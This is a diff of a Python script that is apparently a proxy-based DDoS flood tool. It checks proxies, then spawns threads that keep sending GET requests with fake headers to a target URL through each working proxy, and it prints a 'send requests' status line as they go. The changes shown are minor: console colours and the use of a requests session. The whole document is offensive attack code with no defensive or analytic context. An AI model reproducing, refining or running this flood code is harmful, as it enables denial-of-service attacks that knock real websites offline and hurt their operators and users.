@@ -2,10 +2,9 @@
 # -*- coding: utf-8 -*-
 # Dev: FSystem88
 # Version: 3
-
 import requests as r, os, threading, sys, random, re, time, click, fake_headers
 from threading import Thread
-from colorama import Fore,Style
+from colorama import Fore, Style, Back
 from fake_headers import Headers
 
 def clear(): 
@@ -28,7 +27,7 @@ def check(ip, prox, qtime, url):
 	except:
 		ipx = ip
 	if ip != ipx:
-		print(Fore.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
+		print(Fore.BLACK+Back.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
 		thread_list = []
 		t = threading.Thread (target=ddos, args=(prox, url))
 		thread_list.append(t)
@@ -47,7 +46,8 @@ def ddos(prox, url):
 
 def start_ddos(prox, url, headers, proxies, color):
 	try:
-		req = r.get(url, headers=headers, proxies=proxies)
+		s = r.Session()
+		req = s.get(url, headers=headers, proxies=proxies)
 		if req.status_code == 200:
 			print(color+"{} send requests...".format(prox))
 	except:
